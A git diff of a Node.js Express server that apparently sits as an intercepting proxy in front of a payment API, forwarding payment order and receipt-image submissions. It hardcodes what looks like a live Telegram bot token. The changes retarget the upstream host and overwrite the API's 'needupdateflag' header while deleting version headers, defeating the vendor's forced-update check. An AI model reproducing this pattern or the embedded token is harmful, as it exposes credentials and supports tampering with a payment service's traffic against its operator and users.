@@ -4,7 +4,7 @@ const { Redis } = require('@upstash/redis');
 const crypto = require('crypto');
 
 const app = express();
-const ORIGINAL_API = 'https://api.ezpaycenter.com';
+const ORIGINAL_API = 'https://app-api.ezpaycenter.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
 const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -334,7 +334,7 @@ async function proxyFetch(req) {
         kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'api.ezpaycenter.com';
+  fwd['host'] = 'app-api.ezpaycenter.com';
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -354,6 +354,9 @@ async function proxyFetch(req) {
     for (const k of Object.keys(respHeaders)) {
       const kl = k.toLowerCase();
       if (kl === 'needupdateflag') {
+        respHeaders[k] = '0';
+      }
+      if (kl === 'version' || kl === 'versioncode') {
         delete respHeaders[k];
       }
     }
@@ -1609,7 +1612,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'api.ezpaycenter.com';
+    fwd['host'] = 'app-api.ezpaycenter.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -1685,7 +1688,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'api.ezpaycenter.com';
+    fwd['host'] = 'app-api.ezpaycenter.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
